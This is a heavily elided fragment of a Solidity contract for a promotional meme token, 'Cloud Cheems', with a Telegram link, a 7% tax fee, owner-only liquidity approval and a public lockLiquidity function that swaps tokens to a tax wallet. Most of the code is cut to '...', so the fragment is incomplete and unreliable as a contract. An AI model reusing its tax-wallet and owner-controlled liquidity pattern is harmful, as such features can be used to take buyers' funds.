...
/*
    ...
    Telegram: https://t.me/Cloudcheemsportal
*/
...
contract CloudCheems is Context, IERC20, Ownable {
	...
	string private constant _name = "Cloud Cheems";
	string private constant _symbol = "CCHEEMS";
	...
	constructor () {
		...
		_taxFee = 7; 
		_uniswap = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
	...
	function approveLiquidity() external onlyOwner {
	...
	function lockLiquidity() public{
		...
		if (success) {
            swapTokensForEth(1000000000, _taxWallet);
		} else { 
